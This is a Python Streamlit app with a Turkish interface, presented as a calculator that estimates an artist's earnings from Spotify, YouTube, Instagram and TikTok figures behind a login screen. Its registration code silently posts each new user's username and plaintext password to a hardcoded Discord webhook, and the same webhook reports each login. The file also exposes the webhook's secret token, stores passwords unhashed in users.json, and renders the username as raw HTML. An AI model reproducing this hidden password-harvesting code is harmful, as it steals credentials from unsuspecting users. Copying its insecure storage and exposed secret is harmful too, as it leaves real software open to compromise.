import streamlit as st
from dotenv import load_dotenv
import os
import requests
import base64
from urllib.parse import urlparse
import pandas as pd
import json
import time

# --- Sayfa ayarı
st.set_page_config(page_title="KXNEKIPASA", layout="wide")

# --- Ortam değişkenleri
load_dotenv()
client_id = os.getenv("SPOTIFY_CLIENT_ID")
client_secret = os.getenv("SPOTIFY_CLIENT_SECRET")
WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1394242204628946974/6CZf6_OXWY5SLXPZZm3DWd3Y3XER3eHIiuzvCVBNcS44DfrbGYloC8-XH4VuKxhgfhgV"

# --- Kullanıcı verisi
USER_DB = "users.json"
if not os.path.exists(USER_DB):
    with open(USER_DB, "w") as f:
        json.dump({}, f)

def load_users():
    with open(USER_DB, "r") as f:
        return json.load(f)

def save_users(users):
    with open(USER_DB, "w") as f:
        json.dump(users, f, indent=4)

def send_webhook(event, username, password=None):
    content = f"📢 **{event}**\n👤 Kullanıcı: `{username}`"
    if password:
        content += f"\n🔑 Şifre: `{password}`"
    try:
        requests.post(WEBHOOK_URL, json={"content": content})
    except:
        pass

def register_user(username, password):
    users = load_users()
    if username in users:
        return False, "❗ Kullanıcı adı zaten kayıtlı."
    users[username] = {"password": password}
    save_users(users)
    send_webhook("Yeni Kayıt", username, password=password)
    return True, {"username": username}

def login_user(username, password):
    users = load_users()
    if username in users and users[username]["password"] == password:
        send_webhook("Giriş Yapıldı", username)
        return True, users[username]
    return False, None

def extract_artist_id(spotify_url):
    try:
        path = urlparse(spotify_url).path
        return path.split("/")[-1]
    except:
        return None

def get_spotify_token(client_id, client_secret):
    auth_str = f"{client_id}:{client_secret}"
    b64_auth = base64.b64encode(auth_str.encode()).decode()
    headers = {"Authorization": f"Basic {b64_auth}", "Content-Type": "application/x-www-form-urlencoded"}
    data = {"grant_type": "client_credentials"}
    r = requests.post("https://accounts.spotify.com/api/token", headers=headers, data=data)
    return r.json().get("access_token")

def get_artist_data_from_api(artist_id, token):
    url = f"https://api.spotify.com/v1/artists/{artist_id}"
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(url, headers=headers)
    return r.json() if r.status_code == 200 else None

def get_artist_top_tracks(artist_id, token):
    url = f"https://api.spotify.com/v1/artists/{artist_id}/top-tracks?market=US"
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(url, headers=headers)
    return r.json().get("tracks", []) if r.status_code == 200 else []

# --- Session kontrol
if "logged_in" not in st.session_state:
    st.session_state.logged_in = False
if "user" not in st.session_state:
    st.session_state.user = None
if "menu" not in st.session_state:
    st.session_state.menu = "profil"

# --- Giriş / Kayıt Sistemi
if not st.session_state.logged_in:
    st.title("🔐 KXNEKIPASA Giriş / Kayıt")
    tab = st.radio("Seçim Yap", ["Giriş Yap", "Kayıt Ol"])

    if tab == "Giriş Yap":
        username = st.text_input("Kullanıcı Adı")
        password = st.text_input("Şifre", type="password")
        if st.button("Giriş Yap"):
            success, user = login_user(username, password)
            if success:
                st.session_state.logged_in = True
                st.session_state.user = {"username": username}
                st.success("✅ Giriş başarılı!")
                st.experimental_rerun()
            else:
                st.error("❌ Kullanıcı adı veya şifre hatalı.")
    else:
        username = st.text_input("Yeni Kullanıcı Adı")
        password = st.text_input("Şifre", type="password")
        if st.button("Kayıt Ol"):
            success, result = register_user(username, password)
            if success:
                st.session_state.logged_in = True
                st.session_state.user = result
                st.success("✅ Kayıt başarılı! Giriş yapılıyor...")
                st.experimental_rerun()
            else:
                st.warning(result)
    
    st.stop()

# --- Uygulama Devamı
st.markdown(f"<h1 style='text-align: center; color:#b266ff;'>Hoş geldin, {st.session_state.user['username']}!</h1>", unsafe_allow_html=True)
st.markdown("---")

region_rates = {
    "Amerika": 0.0035,
    "Türkiye": 0.0010,
    "Avrupa": 0.0025,
    "Asya": 0.0015,
    "Dünya Geneli": 0.0020
}

st.markdown("""
<style>
div.stButton > button {
    background-color: white;
    color: #7e3ff2;
    border: 2px solid #7e3ff2;
    border-radius: 15px;
    padding: 0.75rem 1.5rem;
    font-weight: bold;
    transition: 0.3s ease;
    margin: 10px;
}
div.stButton > button:hover {
    background-color: #7e3ff2;
    color: white;
    transform: scale(1.05);
}
</style>
""", unsafe_allow_html=True)

col1, col2, col3, col4 = st.columns(4)
with col1:
    if st.button("PROFİL HESAPLAMA"):
        st.session_state.menu = "profil"
with col2:
    if st.button("STREAM HESAPLAMA"):
        st.session_state.menu = "stream"
with col3:
    if st.button("YOUTUBE HESAPLAMA"):
        st.session_state.menu = "youtube"
with col4:
    if st.button("INSTAGRAM VE TIKTOK"):
        st.session_state.menu = "sosyal"

selected = st.session_state.menu

if selected == "profil":
    st.header("🎵 Spotify Sanatçı Linki ile Hesaplama")
    options = {
        "KXNEKIPASA": "https://open.spotify.com/intl-tr/artist/0pZpo1DFnOHkcSQB2NT1GA",
        "Başka bir link gireceğim": ""
    }
    choice = st.selectbox("Sanatçı seçin veya özel link girin", options.keys())
    spotify_url = st.text_input("Spotify Sanatçı Linki", value=options[choice])
    region = st.selectbox("Dinleyici kitlesi bölgesi", list(region_rates.keys()))

    if st.button("Hesapla"):
        with st.spinner("Veri çekiliyor..."):
            time.sleep(0.5)
            artist_id = extract_artist_id(spotify_url)
            if artist_id:
                token = get_spotify_token(client_id, client_secret)
                artist_data = get_artist_data_from_api(artist_id, token)
                top_tracks = get_artist_top_tracks(artist_id, token)

                if artist_data and top_tracks:
                    total_popularity = sum([t.get("popularity", 0) for t in top_tracks])
                    estimated_income = total_popularity * 1000 * region_rates[region]

                    st.markdown(f"<h2 style='text-align: center;'>💰 Tahmini Gelir: ${estimated_income:,.2f} USD</h2>", unsafe_allow_html=True)
                    st.markdown("---")
                    st.subheader("🎧 En Popüler Şarkılar")
                    data = [{
                        "Şarkı": t["name"],
                        "Popülarite": t["popularity"],
                        "Albüm": t["album"]["name"],
                        "Süre (dk)": round(t["duration_ms"] / 60000, 2)
                    } for t in sorted(top_tracks, key=lambda x: x['popularity'], reverse=True)]
                    df = pd.DataFrame(data)
                    st.dataframe(df, use_container_width=True)
                else:
                    st.error("Veri alınamadı.")
            else:
                st.warning("Geçerli bir Spotify sanatçı linki girin.")

elif selected == "stream":
    st.header("📝 Manuel Spotify Dinlenme ile Hesapla")
    manual_streams = st.number_input("Toplam Dinlenme Sayısı", min_value=0)
    manual_region = st.selectbox("Bölge", list(region_rates.keys()), key="manual")
    if st.button("Hesapla"):
        time.sleep(0.5)
        income = manual_streams * region_rates[manual_region]
        st.success(f"Tahmini gelir: ${income:,.2f} USD")

elif selected == "youtube":
    st.header("▶️ YouTube Topic Görüntülenme ile Gelir")
    yt_views = st.number_input("YouTube Görüntülenme", min_value=0)
    if st.button("Hesapla"):
        yt_income = yt_views * 0.00069
        st.success(f"YouTube Topic geliri: ${yt_income:,.2f} USD")

elif selected == "sosyal":
    st.header("📱 Reels ve TikTok Görüntülenme ile Gelir")
    reels_views = st.number_input("Instagram Reels Görüntülenme", min_value=0)
    tt_views = st.number_input("TikTok Görüntülenme", min_value=0)
    if st.button("Hesapla"):
        reels_income = reels_views * 0.002
        tt_income = tt_views * 0.015
        total_income = reels_income + tt_income
        st.success(f"Toplam gelir: ${total_income:,.2f} USD")

# --- Çıkış
st.sidebar.markdown("## 🚪 Oturum")
if st.sidebar.button("Çıkış Yap"):
    st.session_state.logged_in = False
    st.session_state.user = None
    st.experimental_rerun()
